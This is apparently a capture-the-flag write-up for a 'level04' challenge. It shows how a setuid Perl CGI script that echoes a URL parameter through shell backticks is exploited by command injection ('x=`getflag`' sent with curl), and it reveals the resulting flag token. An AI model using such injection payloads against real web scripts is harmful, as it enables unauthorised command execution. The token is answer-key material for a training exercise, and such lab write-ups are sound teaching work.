ls

L-> level04.pl

a perl script ?

perl level04.pl
|
L-> Content-type : text/html

it remind me of CGI on webserv let's cat it

cat level04.pl
|
L-> #!/usr/bin/perl
L-> # localhost:4747
L-> use CGI qw{param};
L->[...]
L-> x(param("x"));

bingo it use a cgi so we will need to curl it if we want some result
we also see that the function x take the "x" param from the CGI and put it in an echo
let's try it

curl localhost:4747/level04.pl?x=test
|
L-> test

let's go it echo it
we forget to check perm ! maybe it's the same than before...

ll
|
L-> -rwsr-sr-x 1 flag04 [...] level04.pl

bingo... the perl program is launch as flag04 so we need to execute getflag from it
lets re-check the code

cat level04.pl
|
L-> [...]
L-> print `echo $y 2>&1`;

ohoh so it execute the echo command with $y arg ($y is the x param from url)
and the script print it so we need to change the echo command to getflag
we can't edit the script directly buuuut... we can pass param to the script
remember of SQL injection where we close the ' to put our conditions
we can try to do the same with `
as this the command will be:
=> "print `echo `getflag` 2>&1`;"

so we need to set x to `getflag`

let's try this

curl localhost:4747/level04.pl?x="`getflag`"
|
L-> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

kind of simple uh ?
